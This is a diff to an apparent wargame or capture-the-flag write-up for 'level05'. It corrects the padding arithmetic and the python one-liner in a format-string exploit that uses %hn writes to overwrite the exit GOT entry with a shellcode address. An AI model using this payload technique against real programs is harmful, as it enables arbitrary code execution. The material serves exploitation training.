@@ -106,7 +106,7 @@ Our attack takes place in 2 steps:
   - exit GOT address, split into two [4 byte] parts
   - shellcode address in decimal, split into two [4 byte] parts
       - ``` 55346 - 8 bytes (of characters already written)``` -> ```55338```
-      - ```65535 - 55338 bytes (of characters already written)``` -> ```10197```
+      - ```65535 - 55346 bytes (of characters already written)``` -> ```10189```
   -  ```printf()``` formatting arguments: 
       - ```%10$hn``` for 10th argument, half word/short int [2 bytes]
       - ```%11$hn``` for 11th argument, half word/short int [2 bytes]
@@ -116,7 +116,7 @@ Our attack takes place in 2 steps:
 
 Let's try it. 
 ```
-(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55338d%10$hn" + "%10197d%11$hn")'; cat) | ./level05
+(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55338d%10$hn" + "%10189d%11$hn")'; cat) | ./level05
 ```
 
 
